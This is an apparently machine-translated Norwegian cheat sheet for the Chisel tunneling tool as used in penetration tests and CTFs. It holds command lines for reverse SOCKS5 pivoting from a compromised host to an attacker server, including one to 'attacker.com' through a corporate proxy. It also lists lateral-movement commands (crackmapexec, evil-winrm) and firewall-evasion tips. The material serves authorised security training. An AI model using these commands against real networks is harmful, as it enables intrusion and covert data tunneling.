<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🚇 Meisel - komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Meisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ Rask TCP/UDP-tunnel transportert over HTTP, sikret via SSH, pakket som en enkelt bærbar binær</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
- [Slik fungerer det](#-hvordan-fungerer det)
- [Installasjon](#-installasjon)
- [Arkitektur- og tunnelmoduser](#-arkitektur--tunnelmoduser)
- [Standard Pentest Setup: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Trinn 1: Start server på angriper](#step-1-start-server-on-attacker)
  - [Trinn 2: Koble til klient fra mål](#trinn-2-koble-klient-fra-mål)
  - [Trinn 3: Konfigurer proxykjeder](#step-3-configure-proxychains)
  - [Trinn 4: Utfør verktøy over tunnelen](#trinn-4-utfør-verktøy-over-tunnelen)
- [Lokal portvideresending](#-local-portvideresending)
- [Ekstern portvideresending (fanger inngående trafikk)](#-remote-port-videresending-fanger-inngående trafikk)
- [Autentisering og fingeravtrykkfesting](#-autentisering--fingeravtrykkfesting)
- [Egress Evasion & HTTP Proxy Chaining](#-egress-evasion--http-proxy-chaining)
- [Meisel vs Ligolo-ng vs SSH](#-meisel-vs-ligolo-ng-vs-ssh)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Tips og beste fremgangsmåter](#-tips--beste praksis)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**Chisel** er et åpen kildekode, tunneleringsverktøy på tvers av plattformer skrevet i Go som innkapsler sikre SSH-økter innenfor standard HTTP/WebSocket-tilkoblinger.

Fordi trafikken ser ut som standard HTTP/HTTPS- eller WebSocket-kommunikasjon på ledningen, navigerer Chisel enkelt gjennom restriktive brannmurer, Deep Packet Inspection-systemer (DPI) og bedriftswebproxyer som normalt vil blokkere rå SSH- eller VPN-trafikk.

### Nøkkelstyrker

- 🚀 **Enkelt binær:** Inneholder både server og klient i en frittstående statisk kompilert binær.
- 🛡️ **Brannmurunndragelse:** Tunneler over standard port 80/443 eller WebSockets for å blande seg inn i vanlig nettrafikk.
- 🔒 **Kryptert som standard:** Bruker SSH-krypto under panseret (ECDSA-nøkler og AES-GCM).
- 🔄 **SOCKS5 & Port Forwarding:** Oppretter reverserte SOCKS5-proxyer eller spesifikke lokale/eksterne videresendte porter uten problemer.

---

## 🏗️ Slik fungerer det
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 Installasjon

### Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Fra kilde (Go)
```bash
go install github.com/jpillora/chisel@latest
```
### Last ned forhåndskompilerte binære filer

Last ned frittstående binærfiler for Linux, Windows og macOS fra de offisielle utgivelsene:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Standard Pentest-oppsett: Reverse SOCKS5 Proxy

I standard penetrasjonstesting og CTF-er er målmaskinen bak NAT/brannmurer og kan ikke akseptere direkte inngående tilkoblinger fra deg. Du må opprette en **omvendt SOCKS5-proxy**.

### Trinn 1: Start server på angriper

Start Chisel-serveren med å lytte på port `8000` (eller `443` for evasion) med omvendt portvideresending tillatt:
```bash
chisel server --reverse -p 8000 -v
```
### Trinn 2: Koble til klient fra mål

Kjør klienten på den kompromitterte maskinen, koble tilbake til angriperens IP og åpne en omvendt SOCKS5-proxy:

#### Linux-mål:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Windows-mål:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Resultat:** Chisel-serveren på angripermaskinen din åpner port `1080` lokalt som en SOCKS5-proxy rutet gjennom målet!

### Trinn 3: Konfigurer proxy-kjeder

Rediger `/etc/proxychains4.conf` (eller `/etc/proxychains.conf`) på angripermaskinen din:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Trinn 4: Kjør Verktøy over tunnelen

Prefiks ethvert verktøy med `proxychains` for å rute det gjennom den interne kompromitterte verten:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Lokal portvideresending

Videresend en spesifikk intern port fra bak målet direkte til din lokale angripermaskin uten å trenge en full SOCKS-proxy.

### Eksempel: Få tilgang til intern webtjeneste (port 80)

Server på angriper (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Kunde på mål:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Bla nå til `http://127.0.0.1:8080` på angripermaskinen din for å se den interne webserveren!

### Eksempel: Vis intern database (MySQL 3306)

Kunde på mål:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Koble direkte fra angriperterminalen din:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Ekstern portvideresending (fanger inngående trafikk)

Vis en port på målmaskinen som ruter tilbake til en tjeneste på angriperboksen din (nyttig for å betjene nyttelast eller fange tilbakeringinger).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Autentisering og festing av fingeravtrykk

I levende miljøer kan åpne Chisel-porter bli kapret av uautoriserte parter. Beskytt tunnelen din med autentisering:

### Autentisering (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Festing av fingeravtrykk (`--fingerprint`)

Når serveren starter, skriver den ut det offentlige SSH-fingeravtrykket:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Bekreft det på klienten for å forhindre MITM-avskjæring:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Egress Evasion og HTTP Proxy Chaining

Hvis det interne målet bare kan få tilgang til internett gjennom en autentisering av bedriftens proxy:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Meisel vs Ligolo-ng vs SSH

| Funksjon | Meisel | Ligolo-ng | SSH Tunneling |
|--------|--------|----------------|--------------------|
| **Primærmetode** | SOCKS5 & Port Forwarding | TUN-grensesnitt (VPN) | SOCKS5 & Port Forwarding |
| **Transportprotokoll** | HTTP / WebSocket | Rå TLS | SSH (Port 22) |
| **Brannmurunndragelse** | ⭐⭐⭐⭐⭐ Eksepsjonell | ⭐⭐⭐⭐ Veldig bra | ⭐⭐ Dårlig (Port 22 vanligvis blokkert) |
| **Krever Root/Admin**| ❌ Nei (kun brukerland) | ✅ Ja (for å lage TUN-enhet) | ❌ Nei |
| **Nmap SYN Scan (`-sS`)**| ❌ Nei | ✅ Ja | ❌ Nei |
| **UDP-støtte** | Delvis (via SOCKS5) | ✅ Full native UDP | ❌ Svært begrenset |

---

## 📊 Hurtigreferansetabell

| Modus | Kommando | Formål |
|------|--------|--------|
| **Server (omvendt)** | `chisel server --reverse -p 8000` | Start omvendt serverlytting på 8000 |
| **Klient (Reverse SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Lag omvendt SOCKS5 på angriperens port 1080 |
| **Klient (Forward Port)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Kartlegg målets port 80 til angriperens 8080 |
| **Klient (eksponer angriperport)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Åpne port 4444 på målruting til angriper |
| **Auth Server** | `chisel server --reverse --auth "u:p" -p 8000` | Krev legitimasjon fra tilknyttede klienter |
| **Auth Client** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Koble til med legitimasjon |
| **Keep-Alive Tuning** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Forhindre frafall av inaktive brannmurer |

---

## 💡 Tips og beste fremgangsmåter

1. **Bruk port 443 for maksimal unndragelse:**
   Brannmurer inspiserer ofte trafikk på vilkårlige porter som 8000 eller 8080. Å kjøre Chisel-serveren på port `443` sikrer at trafikken ser identisk ut med HTTPS WebSockets.
2. **Tune proxychains Timeout:**
   Hvis proxychain-tilkoblinger føles trege, rediger `/etc/proxychains4.conf` og still inn:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Ingen root-privilegier kreves på mål:**
   I motsetning til VPN- eller TUN-løsninger, kjører Chisel utelukkende i brukerrommet. Du kan kjøre `chisel.exe` eller `chisel` som tjenestekontoer med lav privilegium (`www-data`, `nobody`, standard Windows-bruker).

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** Meisel er beregnet for autorisert nettverkstesting, simulering av rødt team og systemadministrasjon. Utplassering av tunnelverktøy på uautoriserte nettverk bryter datasikkerhetslover.

---

## 📚 Ressurser

- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [Proxychains-NG Project](https://github.com/rofl0r/proxychains-ng)